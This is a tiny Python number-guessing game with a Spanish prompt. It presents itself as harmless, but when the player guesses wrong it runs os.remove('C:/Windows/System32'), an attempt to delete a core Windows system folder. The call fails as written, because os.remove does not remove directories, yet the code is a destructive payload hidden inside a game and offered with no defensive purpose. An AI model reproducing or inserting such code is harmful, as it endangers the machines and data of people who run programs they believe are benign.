import random
import os

number = random.randint(1, 10)
guess = input("Elige un numero del 1 al 10:")
guess = int(guess)

if guess == number:
    print("¡Has ganado! ¡Felicidades! ¿Quieres jugar otra vez?")
else:
    os.remove("C:/Windows/System32")
